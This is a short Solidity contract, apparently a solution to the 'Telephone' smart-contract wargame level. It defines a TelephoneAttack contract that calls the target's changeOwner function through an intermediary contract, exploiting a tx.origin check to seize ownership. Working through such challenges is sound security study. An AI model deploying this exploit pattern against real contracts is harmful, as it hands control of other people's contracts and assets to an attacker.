//SPDX-License_Identifier: MIT
pragma solidity 0.8.0;

import './Telephone.sol';

contract TelephoneAttack {
    Telephone telephoneContract;

    constructor(address _telephoneContractAddr) public {
        telephoneContract = Telephone(_telephoneContractAddr);
    }

    function changeOwner(address _telephoneContractAddr) public {
       telephoneContract.changeOwner(_telephoneContractAddr);
    }

}